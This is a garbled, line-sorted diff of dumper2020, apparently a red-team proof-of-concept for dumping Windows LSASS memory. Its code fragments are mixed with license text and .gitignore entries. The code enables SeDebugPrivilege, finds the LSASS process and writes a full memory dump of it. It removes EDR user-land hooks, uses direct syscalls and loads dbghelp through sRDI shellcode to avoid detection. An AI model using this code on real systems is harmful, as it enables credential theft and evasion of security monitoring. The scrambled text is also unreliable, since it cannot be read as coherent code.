+ because we have git 
+ before dumping LSASS.
+ before dumping LSASS. The [associated write-up](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/) is a fixture in the modern red team blog corpus.
+ builds a DLL that links the static library and attempts to dump LSASS to 
+ builds a static library that provides the core functionality.
+ builds an EXE that links the static library and attempts to dump LSASS to 
+ but database connection strings (with potential passwords) will be unencrypted
+ but keep track of directories ending in .cache
+ cache files
+ dllBytes[1] != 'Z')
+ dllSize
+ dumper2020
+ files ending in .cache can be ignored
+ files generated by popular Visual Studio add-ons.
+ fnMiniDumpWriteDump)(
+ fnPssCaptureSnapshot)(
+ fnPssFreeSnapshot)(
+ fnRtlEqualUnicodeString)(
+ fnRtlInitUnicodeString)(
+ for details type 
+ fresh).
+ function.
+ i < LmExportDirectory->NumberOfNames
+ i < exportDir->NumberOfNames
+ i < moduleCount
+ i < tokenPrivs->PrivilegeCount
+ in the current directory when executed.
+ in these scripts will be unencrypted
+ it applies also to
+ itr != module->HookedFunctions.end()
+ lpProcName == NULL)
+ moduleHandles = nullptr
+ moduleHandles)
+ processInfo->NextEntryDelta)
+ rdiShellcodeLength
+ rdiShellcodeLength 
+ report files from converting an old project file
+ rva)
+ section 10
+ size)
+ sizeof(bootstrap)
+ sizeof(bootstrap) 
+ text=auto
+ tools/
+ type 
+ userSize 
+ when executed.
+ within the Source form or
+ without even the implied warranty of
+!.axoCover/settings.json
+![dumper2020](dumper2020.png)
+"                                        wcout << ""["
+"                                    else wcout << ""[!] Failed to enable SeDebugPrivilege"" << endl"
+"                                    if (NtAdjustPrivilegesToken(token, FALSE, tokenPrivs, tokenPrivsSize, NULL, NULL) == 0)"
+"                                    wcout << ""["
+"                                // Located SeDebugPrivilege, enable it if necessary"
+"                                wcout << ""[!] Dump failed: "" << GetLastError() << endl"
+"                                wcout << ""["
+"                            PssFreeSnapshot(GetCurrentProcess(), snapshot)"
+"                            if ((status = MiniDumpWriteDump(snapshot, NULL, dump, MiniDumpWithFullMemory, NULL, NULL, "
+"                            wcout << ""[!] Token does not have SeDebugPrivilege"" << endl"
+"                            wcout << ""["
+"                           Version 2.0, January 2004"
+"                        // Found lsass.exe, capture the PID"
+"                        else wcout << ""[!] Failed to take snapshot of LSASS: "" << snapshotResult << endl"
+"                        if ((snapshotResult = PssCaptureSnapshot(lsass, (PSS_CAPTURE_FLAGS)snapshotFlags, CONTEXT_ALL, "
+"                        wcout << ""    ! Failed to unhook "" << failure << "" functions"" << endl"
+"                        wcout << ""    "
+"                       Version 3, 29 June 2007"
+"                    // Successfully enumerated modules, get module count"
+"                    // sRDI successful, get MiniDumpWriteDump function pointer"
+"                    FILE_SHARE_WRITE, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0)"
+"                    else wcout << ""[!] Failed to locate MiniDumpWriteDump function"" << endl"
+"                    else wcout << ""[!] Failed to query token privileges"" << endl"
+"                    fnMiniDumpWriteDump MiniDumpWriteDump = (fnMiniDumpWriteDump)GetProcAddressR(debugDll, ""MiniDumpWriteDump"")"
+"                    if (NtQueryInformationToken(token, TokenPrivileges, tokenPrivs, tokenPrivsSize, "
+"                    wcout << ""[=] Module: "" << module->Path << endl"
+"                // Create unicode string for ""lsass.exe"""
+"                // Token is elevated, check/enable SeDebugPrivilege"
+"                CopyMemory(HookedFunction->FreshBytes, FmFunction, PATCH_SIZE)"
+"                GetModuleFileNameExW(process, module->Handle, module->Path, MAX_PATH)"
+"                MultiByteToWideChar(CP_UTF8, NULL, (LPCCH)((DWORD_PTR)LmHandle "
+"                else wcout << ""[!] Failed to determine size of token privileges array"" << endl"
+"                else wcout << ""[!] Failed to load debug DLL via sRDI"" << endl"
+"                if ((EnumProcessModulesEx(process, moduleHandles, bytesRequired, "
+"                if (NtQueryInformationToken(token, TokenPrivileges, NULL, NULL, "
+"                wcout << ""[!] Failed to remove dump file"" << endl"
+"                wcout << ""["
+"            // Dump failed, attempt to clean up"
+"            // Loop through modules, start at 1 to skip ourselves"
+"            HeapFree(heap, NULL, processInfoBuffer)"
+"            VirtualQuery(LmFunction, "
+"            else wcout << ""[!] Administrative privileges required"" << endl"
+"            else wcout << ""[!] Failed to open LSASS"" << endl"
+"            else wcout << ""[!] Failed to query system process information"" << endl"
+"            if (NtProtectVirtualMemory(hProc, "
+"            if (NtQuerySystemInformation(SystemProcessInformation, processInfoBuffer, processInfoSize, "
+"            if (memcmp(LmFunction, FmFunction, PATCH_SIZE))"
+"            return RVA(FARPROC, hModule, funcRva)"
+"          attribution notices from the Source form of the Work,"
+"          distribution, then any Derivative Works that You distribute must"
+"          documentation, if provided along with the Derivative Works"
+"          notices within Derivative Works that You distribute, alongside"
+"          or as an addendum to the NOTICE text from the Work, provided"
+"          pertain to any part of the Derivative Works, in at least one"
+"          that You distribute, all copyright, patent, trademark, and"
+"          within a display generated by the Derivative Works, if and"
+"          within such NOTICE file, excluding those notices that do not"
+"        // Failed to enumerate modules, check if buffer wasn't big enough"
+"        HeapFree(heap, NULL, moduleHandles)"
+"        else wcout << ""[!] Failed to allocate memory for system process information"" << endl"
+"        else wcout << ""[!] Failed to enumerate process modules"" << endl"
+"        else wcout << ""[!] Failed to locate LSASS PID"" << endl"
+"        else wcout << ""[!] Failed to query token elevation status"" << endl"
+"        expNameStr = RVA(LPCSTR, hModule, "
+"        fseek(fp, 0, SEEK_END)"
+"        fseek(fp, 0, SEEK_SET)"
+"        if (!_stricmp(lpProcName, expNameStr)) {"
+"        if ((processInfoBuffer = HeapAlloc(heap, HEAP_ZERO_MEMORY, processInfoSize)))"
+"        if (NtQueryInformationToken(token, TokenElevation, "
+"        if (NtWriteVirtualMemory(hProc, pHookedFunction->Address, pHookedFunction->FreshBytes, PATCH_SIZE, "
+"        wcout << ""[!] 64-bit architecture only"" << endl"
+"      ""Contribution"" shall mean any work of authorship, including"
+"      ""Contributor"" shall mean Licensor and any individual or Legal Entity"
+"      ""Derivative Works"" shall mean any work, whether in Source or Object"
+"      ""Legal Entity"" shall mean the union of the acting entity and all"
+"      ""License"" shall mean the terms and conditions for use, reproduction,"
+"      ""Licensor"" shall mean the copyright owner or entity authorized by"
+"      ""Object"" form shall mean any form resulting from mechanical"
+"      ""Source"" form shall mean the preferred form for making modifications,"
+"      ""Work"" shall mean the work of authorship, whether in Source or"
+"      ""You"" (or ""Your"") shall mean an individual or Legal Entity"
+"      ""control"" means (i) the power, direct or indirect, to cause the"
+"      (c) You must retain, in the Source form of any Derivative Works"
+"      (d) If the Work includes a ""NOTICE"" text file as part of its"
+"      (except as stated in this section) patent license to make, have made,"
+"      Contributor provides its Contributions) on an ""AS IS"" BASIS,"
+"      License. However, in accepting such obligations, You may act only"
+"      Licensor for the purpose of discussing and improving the Work, but"
+"      Notwithstanding the above, nothing herein shall supersede or modify"
+"      Object form, made available under the License, as indicated by a"
+"      To apply the Apache License to your work, attach the following"
+"      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or"
+"      Work (including but not limited to damages for loss of goodwill,"
+"      Work or Derivative Works thereof in any medium, with or without"
+"      agreed to in writing, Licensor provides the Work (and each"
+"      and charge a fee for, acceptance of support, warranty, indemnity,"
+"      and issue tracking systems that are managed by, or on behalf of, the"
+"      boilerplate notice, with the fields enclosed by brackets ""[]"""
+"      communication on electronic mailing lists, source code control systems,"
+"      control with that entity. For the purposes of this definition,"
+"      copyright license to reproduce, prepare Derivative Works of,"
+"      defend, and hold each Contributor harmless for any liability"
+"      designated in writing by the copyright owner as ""Not a Contribution."""
+"      direction or management of such entity, whether by contract or"
+"      editorial revisions, annotations, elaborations, or other modifications"
+"      for any such Derivative Works as a whole, provided Your use,"
+"      for use, reproduction, or distribution of Your modifications, or"
+"      form, that is based on (or derived from) the Work and for which the"
+"      implied, including, without limitation, any warranties or conditions"
+"      incidental, or consequential damages of any character arising as a"
+"      including but not limited to software source code, documentation"
+"      incurred by, or claims asserted against, such Contributor by reason"
+"      liable to You for damages, including any direct, indirect, special,"
+"      means any form of electronic, verbal, or written communication sent"
+"      modifications, and in Source or Object form, provided that You"
+"      names, trademarks, service marks, or product names of the Licensor,"
+"      negligent acts) or agreed to in writing, shall any Contributor be"
+"      not limited to compiled object code, generated documentation,"
+"      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A"
+"      of any other Contributor, and only if You agree to indemnify,"
+"      of this License, Derivative Works shall not include works that remain"
+"      on Your own behalf and on Your sole responsibility, not on behalf"
+"      or contributory patent infringement, then any patent licenses"
+"      other commercial damages or losses), even if such Contributor"
+"      other entities that control, are controlled by, or are under common"
+"      otherwise, or (ii) ownership of fifty percent (50%) or more of the"
+"      outstanding shares, or (iii) beneficial ownership of such entity."
+"      publicly display, publicly perform, sublicense, and distribute the"
+"      represent, as a whole, an original work of authorship. For the purposes"
+"      reproduction, and distribution of the Work otherwise complies with"
+"      same ""printed page"" as the copyright notice for easier"
+"      separable from, or merely link (or bind by name) to the interfaces of,"
+"      source, and configuration files."
+"      the Work or Derivative Works thereof, You may choose to offer,"
+"      the copyright owner. For the purposes of this definition, ""submitted"""
+"      this License, each Contributor hereby grants to You a perpetual,"
+"      this License, without any additional terms or conditions."
+"      to that Work or Derivative Works thereof, that is intentionally"
+"      to the Licensor or its representatives, including but not limited to"
+"      transformation or translation of a Source form, including but"
+"      use, offer to sell, sell, import, and otherwise transfer the Work,"
+"      whether in tort (including negligence), contract, or otherwise,"
+"      work stoppage, computer failure or malfunction, or any and all"
+"      worldwide, non-exclusive, no-charge, royalty-free, irrevocable"
+"    ""keep intact all notices""."
+"    (including a physical distribution medium), accompanied by a"
+"    (including a physical distribution medium), accompanied by the"
+"    // Get system directory, e.g. c:"
+"    // Size of process info table, set by NtQuerySystemInformation"
+"    // Successfully enumerated modules, get module count"
+"    // add r8, <Offset of the DLL> "
+"    // add rcx, <Offset of the DLL>"
+"    // and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes"
+"    // mov edx, <hash of function>"
+"    // mov r8, rcx - copy our location in memory to r8 before we start modifying RCX"
+"    // mov r9d, <Length of User Data>"
+"    // mov rsi, rsp - store our current stack pointer for later"
+"    // mov rsp, rsi - Reset our original stack pointer"
+"    // sub rsp, 0x30 - Create some breathing room on the stack "
+"    <ClCompile Include=""dumper2020.cpp"" />"
+"    <ClCompile Include=""dumper2020.cpp"">"
+"    <ClCompile Include=""dumper2020_dll.cpp"" />"
+"    <ClCompile Include=""dumper2020_dll.cpp"">"
+"    <ClCompile Include=""dumper2020_exe.cpp"" />"
+"    <ClCompile Include=""dumper2020_exe.cpp"">"
+"    <ClCompile Include=""hooks.cpp"" />"
+"    <ClCompile Include=""hooks.cpp"">"
+"    <ClCompile Include=""srdi.cpp"" />"
+"    <ClCompile Include=""srdi.cpp"">"
+"    <ClInclude Include=""dumper2020.h"" />"
+"    <ClInclude Include=""dumper2020.h"">"
+"    <ClInclude Include=""hooks.h"" />"
+"    <ClInclude Include=""hooks.h"">"
+"    <ClInclude Include=""proto.h"" />"
+"    <ClInclude Include=""proto.h"">"
+"    <ClInclude Include=""srdi.h"" />"
+"    <ClInclude Include=""srdi.h"">"
+"    <ClInclude Include=""whisper.h"" />"
+"    <ClInclude Include=""whisper.h"">"
+"    <Filter Include=""Header Files"">"
+"    <Filter Include=""Resource Files"">"
+"    <Filter Include=""Source Files"">"
+"    <Import Project=""$(UserRootDir)"
+"    <Import Project=""$(VCTargetsPath)"
+"    <MASM Include=""whisper.asm"">"
+"    <ProjectConfiguration Include=""Debug"
+"    <ProjectConfiguration Include=""Release"
+"    CLIENT_ID cid = { ULongToHandle(pid), NULL }"
+"    Corresponding Source, you remain obligated to ensure that it is"
+"    DWORD                             ProcessId,"
+"    DWORD             ThreadContextFlags,"
+"    HANDLE                            hFile,"
+"    HANDLE                            hProcess,"
+"    HANDLE            ProcessHandle,"
+"    HANDLE FmFileHandle = CreateFile(pModule->Path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)"
+"    HANDLE FmMappingHandle = CreateFileMapping(FmFileHandle, NULL, PAGE_READONLY "
+"    HANDLE ProcessHandle,"
+"    HMODULE FmHandle = (HMODULE)MapViewOfFile(FmMappingHandle, FILE_MAP_READ, 0, 0, 0)"
+"    HMODULE kernel32 = GetModuleHandle(L""kernel32.dll"")"
+"    HMODULE ntdll = GetModuleHandle(L""ntdll.dll"")"
+"    LPCSTR rdiShellcode = """
+"    License will therefore apply, along with any applicable section 7"
+"    MINIDUMP_TYPE                     DumpType,"
+"    MoveMemory(outBytes, bootstrap, sizeof(bootstrap))"
+"    OBJECT_ATTRIBUTES oa = { NULL, NULL, NULL, NULL }"
+"    PCUNICODE_STRING String2,"
+"    PDWORD expName = RVA(PDWORD, hModule, exportDir->AddressOfNames)"
+"    PIMAGE_EXPORT_DIRECTORY exportDir = RVA(PIMAGE_EXPORT_DIRECTORY, hModule, dataDir->VirtualAddress)"
+"    PIMAGE_NT_HEADERS ntHeaders = RVA(PIMAGE_NT_HEADERS, hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew)"
+"    PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,"
+"    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,"
+"    PSS_CAPTURE_FLAGS CaptureFlags,"
+"    PSS_CAPTURE_HANDLES = 0x00000004,"
+"    PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010,"
+"    PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008,"
+"    PSS_CAPTURE_HANDLE_TRACE = 0x00000040,"
+"    PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020,"
+"    PSS_CAPTURE_IPT_TRACE = 0x00002000,"
+"    PSS_CAPTURE_NONE = 0x00000000,"
+"    PSS_CAPTURE_RESERVED_00000002 = 0x00000002,"
+"    PSS_CAPTURE_RESERVED_00000400 = 0x00000400,"
+"    PSS_CAPTURE_THREADS = 0x00000080,"
+"    PSS_CAPTURE_THREAD_CONTEXT = 0x00000100,"
+"    PSS_CAPTURE_THREAD_CONTEXT_EXTENDED = 0x00000200,"
+"    PSS_CAPTURE_VA_CLONE = 0x00000001,"
+"    PSS_CAPTURE_VA_SPACE = 0x00000800,"
+"    PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00001000,"
+"    PSS_CREATE_BREAKAWAY = 0x08000000,"
+"    PSS_CREATE_BREAKAWAY_OPTIONAL = 0x04000000,"
+"    PSS_CREATE_FORCE_BREAKAWAY = 0x10000000,"
+"    PSS_CREATE_MEASURE_PERFORMANCE = 0x40000000,"
+"    PSS_CREATE_USE_VM_ALLOCATIONS = 0x20000000,"
+"    PUNICODE_STRING DestinationString,"
+"    PUNICODE_STRING String1,"
+"    PWORD expOrdinal = RVA(PWORD, hModule, exportDir->AddressOfNameOrdinals)"
+"    PssCaptureSnapshot = (fnPssCaptureSnapshot)GetProcAddress(kernel32, ""PssCaptureSnapshot"")"
+"    PssFreeSnapshot = (fnPssFreeSnapshot)GetProcAddress(kernel32, ""PssFreeSnapshot"")"
+"    Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution."
+"    Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer."
+"    RtlEqualUnicodeString = (fnRtlEqualUnicodeString)GetProcAddress(ntdll, ""RtlEqualUnicodeString"")"
+"    RtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddress(ntdll, ""RtlInitUnicodeString"")"
+"    This is free software, and you are welcome to redistribute it"
+"    This program is distributed in the hope that it will be useful,"
+"    UINT systemDirSize = GetSystemDirectoryA(systemDir, MAX_PATH)"
+"    __in     PVOID CallbackParam,"
+"    __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,"
+"    a) Convey the object code in, or embodied in, a physical product"
+"    additional terms, to the whole of the work, and all its parts,"
+"    along with this program.  If not, see <http://www.gnu.org/licenses/>."
+"    alternative is allowed only occasionally and noncommercially, and"
+"    b) Convey the object code in, or embodied in, a physical product"
+"    c) Prohibiting misrepresentation of the origin of that material, or"
+"    c) You must license the entire work, as a whole, under this"
+"    conveying of source, or (2) access to copy the"
+"    copy the object code is a network server, the Corresponding Source"
+"    d) If the work has interactive user interfaces, each must display"
+"    e) Convey the object code using peer-to-peer transmission, provided"
+"    else wcout << ""[!] Failed to allocate memory for module handle array"" << endl"
+"    else wcout << ""[!] Failed to create dump file"" << endl"
+"    else wcout << ""[!] Failed to determine amount of memory needed for system process information"" << endl"
+"    else wcout << ""[!] Failed to open process token"" << endl"
+"    if (!(EnumProcessModulesEx(process, moduleHandles, sizeof(HMODULE) "
+"    if (!ConvertToShellcode(dllPath, NULL, NULL, NULL, NULL, srdiBuffer, bufferSize))"
+"    if (!GetFileContents(dllFile, "
+"    if (NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY "
+"    if (NtProtectVirtualMemory(GetCurrentProcess(), "
+"    if (NtProtectVirtualMemory(hProc, "
+"    if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, "
+"    interfaces that do not display Appropriate Legal Notices, your"
+"    it) with contractual assumptions of liability to the recipient, for"
+"    it, and giving a relevant date."
+"    medium customarily used for software interchange, for a price no"
+"    model, to give anyone who possesses the object code either (1) a"
+"    only if you received the object code with such an offer, in accord"
+"    permission to license the work in any other way, but it does not"
+"    place (gratis or for a charge), and offer equivalent access to the"
+"    product that is covered by this License, on a durable physical"
+"    string path(systemDir, systemDirSize)"
+"    that supports equivalent copying facilities, provided you maintain"
+"    the Free Software Foundation, either version 3 of the License, or"
+"    trade names, trademarks, or service marks"
+"    written offer, valid for at least three years and valid for as"
+"    wstring ntPath(L"""
+"   5. Submission of Contributions. Unless You explicitly state otherwise,"
+"   8. Limitation of Liability. In no event and under no legal theory,"
+"   Licensed under the Apache License, Version 2.0 (the ""License"")"
+"   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION"
+"   Unless required by applicable law or agreed to in writing, software"
+"   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
+"   distributed under the License is distributed on an ""AS IS"" BASIS,"
+"  ""Additional permissions"" are terms that supplement the terms of this"
+"  ""Copyright"" also means copyright-like laws that apply to other kinds of"
+"  ""Installation Information"" for a User Product means any methods,"
+"  ""The Program"" refers to any copyrightable work licensed under this"
+"  ""This License"" refers to version 3 of the GNU General Public License."
+"  <Import Project=""$(VCTargetsPath)"
+"  <ImportGroup Label=""ExtensionSettings"">"
+"  <ImportGroup Label=""ExtensionTargets"">"
+"  <ImportGroup Label=""PropertySheets"" Condition=""'$(Configuration)"
+"  <ImportGroup Label=""Shared"">"
+"  <ItemDefinitionGroup Condition=""'$(Configuration)"
+"  <ItemGroup Label=""ProjectConfigurations"">"
+"  <PropertyGroup Condition=""'$(Configuration)"
+"  <PropertyGroup Label=""Globals"">"
+"  <PropertyGroup Label=""UserMacros"" />"
+"  A ""Standard Interface"" means an interface that either is an official"
+"  A ""User Product"" is either (1) a ""consumer product"", which means any"
+"  A ""contributor"" is a copyright holder who authorizes use under this"
+"  A ""covered work"" means either the unmodified Program or a work based"
+"  A contributor's ""essential patent claims"" are all patent claims"
+"  A patent license is ""discriminatory"" if it does not include within"
+"  A separable portion of the object code, whose source code is excluded"
+"  Additional terms, permissive or non-permissive, may be stated in the"
+"  All other non-permissive additional terms are considered ""further"
+"  An ""entity transaction"" is a transaction transferring control of an"
+"  An interactive user interface displays ""Appropriate Legal Notices"""
+"  Corresponding Source conveyed, and Installation Information provided,"
+"  Each contributor grants you a non-exclusive, worldwide, royalty-free"
+"  Each time you convey a covered work, the recipient automatically"
+"  Finally, every program is threatened constantly by software patents."
+"  For example, if you distribute copies of such a program, whether"
+"  For the developers' and authors' protection, the GPL clearly explains"
+"  However, if you cease all violation of this License, then your"
+"  If conditions are imposed on you (whether by court order, agreement or"
+"  If the program does terminal interaction, make it output a short"
+"  If you add terms to a covered work in accord with this section, you"
+"  If you convey a covered work, knowingly relying on a patent license,"
+"  If you convey an object code work under this section in, or with, or"
+"  If you develop a new program, and you want it to be of the greatest"
+"  If, pursuant to or in connection with a single transaction or"
+"  In the following three paragraphs, a ""patent license"" is any express"
+"  Moreover, your license from a particular copyright holder is"
+"  Notwithstanding any other provision of this License, for material you"
+"  Notwithstanding any other provision of this License, you have"
+"  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY"
+"  The ""Corresponding Source"" for a work in object code form means all"
+"  The ""System Libraries"" of an executable work include anything, other"
+"  The ""source code"" for a work means the preferred form of the work"
+"  The GNU General Public License is a free, copyleft license for"
+"  The precise terms and conditions for copying, distribution and"
+"  To ""convey"" a work means any kind of propagation that enables other"
+"  To ""modify"" a work means to copy from or adapt all or part of the work"
+"  To ""propagate"" a work means to do anything with it that, without"
+"  To do so, attach the following notices to the program.  It is safest"
+"  To protect your rights, we need to prevent others from denying you"
+"  When we speak of free software, we are referring to freedom, not"
+"  When you convey a copy of a covered work, you may at your option"
+"  When you convey a covered work, you waive any legal power to forbid"
+"  You may charge any price or no price for each copy that you convey,"
+"  You may convey a work based on the Program, or the modifications to"
+"  You may make, run and propagate covered works that you do not"
+"  You should also get your employer (if you work as a programmer) or school,"
+" - Building on @SpecialHoang's work, [Dumpert](https://github.com/outflanknl/Dumpert) uses syscalls to unhook "
+" - No LSASS dumping/EDR avoiding tool is complete without crediting this [2019 Medium post](https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6) and the associated proof-of-concept, [AndrewSpecial](https://github.com/hoangprod/AndrewSpecial), which uses Win32 API functions to unhook "
+" 0x20], <Flags> - Push arg 5 just above shadow space"
+" 1024, "
+" As a proof-of-concept, this solution should not be considered operationally secure as is"
+" Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>"
+" Coverlet is a free, cross platform Code Coverage Tool"
+" Ignore Visual Studio temporary files, build results, and"
+" LOSS OF USE, DATA, OR PROFITS"
+" LmNameTable[i]), -1, (LPWSTR)HookedFunction->Name, MAX_PATH - 1)"
+" Note: Comment the next line if you want to checkin your web deploy settings,"
+" OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
+" PROCESS_QUERY_INFORMATION, "
+" Redistributions in binary form must reproduce the above copyright notice, this list of "
+" Redistributions of source code must retain the above copyright notice, this list of "
+" SEC_IMAGE, 0, 0, NULL)"
+" Since there are multiple workflows, uncomment next line to ignore bower_components"
+" TOKEN_ADJUST_PRIVILEGES, "
+" UNHOOKED "" << success << "" functions"" << endl"
+" bypass detailed in this [blog post](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/) and the associated proof-of-concept, [ATPMiniDump](https://github.com/b4rtik/ATPMiniDump)."
+" checkin your Azure Web App publish settings, but sensitive information contained"
+" data, DWORD "
+" dllSize, userData, userSize)"
+" except build/, which is used as an MSBuild target."
+" for a GUI interface, you would use an ""about box""."
+" however, if the Program has interactive"
+" i, "
+" is hooked, dumping LSASS will still generate alerts. Dumper2020 builds on the Dumpert idea and uses syscalls for most tasks where possible but takes things up a notch by attempting to remove all user-land API hooks before calling "
+" is typically enough to avoid EDR preventative measures when dumping LSASS. However, if "
+" of this license document, but changing it is not allowed."
+" or,"
+" rdiShellcodeLength, dllBytes, dllSize)"
+" sizeof(bootstrap), rdiShellcode, rdiShellcodeLength)"
+" to a newer Visual Studio version. Backup files are not needed,"
+"""Major Component"", in this context, means a major essential component"
+"""aggregate"" if the compilation and its resulting copyright are not"
+"""recipients"" may be individuals or organizations."
+"(1) assert copyright on the software, and (2) offer you this License"
+"(if any) on which the executable work runs, or a compiler used to"
+"(kernel, window system, and so on) of the specific operating system"
+")HeapAlloc(heap, HEAP_ZERO_MEMORY, sizeof(HMODULE) "
+")HeapReAlloc(heap, HEAP_ZERO_MEMORY, moduleHandles, bytesRequired)))"
+", expName"
+", expOrdinal"
+". If successful, this should further reduce the chance of preventative action and decrease the overall indicator footprint. User-land API hooks are only one source of telemetry, though. EDR sensors will still record the following events, at least, thanks to kernel callbacks and mini-filters:"
+"//              size of function parameters, sRDI flags (optional), output buffer (out), output buffer length (out)"
+"// - Name:         Name of the function, if it exists."
+"// Arguments:   DLL filename (in), function to execute on load (optional), function parameters (optional),"
+"// Arguments:   Path to file (in), pointer to buffer (out), size of buffer (out)"
+"// Description: Verify 64-bit architecture, elevated context, and SeDebugPrivilege (enable as needed)"
+"// Dump to ""log.txt"" in the current directory"
+"// Returns:     Handle to dump file, NULL on failure"
+"// Returns:     Handle to target process, NULL on failure"
+"// Returns:     Major version, e.g. 5, 6, 10"
+"// Returns:     Number of loaded modules, 0 on failure"
+"// Returns:     PID, 0 on failure"
+"// Returns:     True if all functions are resolved, false if any are not"
+"// Returns:     True if all requirements are met, false if any are not"
+"11 of the WIPO copyright treaty adopted on 20 December 1996, or"
+"<Project DefaultTargets=""Build"" ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"= ""dbgcore.dll"""
+"= ""dbghelp.dll"""
+"ALL NECESSARY SERVICING, REPAIR OR CORRECTION."
+"As demonstrated by AndrewSpecial and Dumpert, unhooking "
+"BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)"
+"BOOL ATPMiniDumpWriteDumpCallback(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput)"
+"BOOL ConvertToShellcode(LPCSTR dllFile, DWORD userFunction, LPVOID userData, DWORD userSize, DWORD flags, LPSTR "
+"BOOL ConvertToShellcode(LPCSTR inFile, DWORD userFunction, LPVOID userData, DWORD userSize, DWORD flags, LPSTR "
+"BOOL GetFileContents(LPCSTR filename, LPSTR "
+"CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR "
+"CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR "
+"Component, and (b) serves only to enable use of the work with that"
+"Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)"
+"Copyright (c) 2013, Matthew Graeber"
+"Copyright (c) 2015, Dan Staples"
+"Corresponding Source of the work from the predecessor in interest, if"
+"Dump((LPWSTR)L""C:"
+"Dumper2020 relies almost completely on the work of others, to whom I owe a great deal of thanks:"
+"FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName)"
+"For more information on this, and how to apply and follow the GNU GPL, see"
+"For reference, dumper2020 uses the following syscalls:"
+"GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE"
+"GNU General Public License, you may choose any version ever published"
+"GetCurrentDirectory(MAX_PATH, "
+"HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY"
+"IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND"
+"IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF"
+"License and any other pertinent obligations, then as a consequence you may"
+"License will continue to apply to the part which is the covered work,"
+"License, you may add to a covered work material governed by the terms"
+"License.  Each licensee is addressed as ""you"".  ""Licensees"" and"
+"Major Component, or to implement a Standard Interface for which an"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.Cpp.$(Platform).user.props"" Condition=""exists('$(UserRootDir)"
+"Microsoft.Cpp.$(Platform).user.props')"" Label=""LocalAppDataPlatform"" />"
+"Microsoft.Cpp.Default.props"" />"
+"Microsoft.Cpp.props"" />"
+"Microsoft.Cpp.targets"" />"
+"OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,"
+"OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE "
+"PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),"
+"Program, unless a warranty or assumption of liability accompanies a"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""dumper2020"", ""dumper2020"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""dumper2020_dll"", ""dumper2020_dll"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""dumper2020_exe"", ""dumper2020_exe"
+"Public License ""or any later version"" applies to it, you have the"
+"Public License instead of this License.  But first, please read"
+"RVA(PDWORD, hModule, exportDir->AddressOfFunctions "
+"Redistribution and use in source and binary forms, with or without modification, are permitted "
+"Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:"
+"Syscall macros are not provided, but can be quickly generated with [SysWhispers](https://github.com/jthuraisamy/SysWhispers). Please refer to that project's [README](https://github.com/jthuraisamy/SysWhispers/blob/master/README.md) for integration guidance. Alternative syscall implementations could be leveraged with minimal effort."
+"System Libraries, or general-purpose tools or generally available free"
+"THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY"
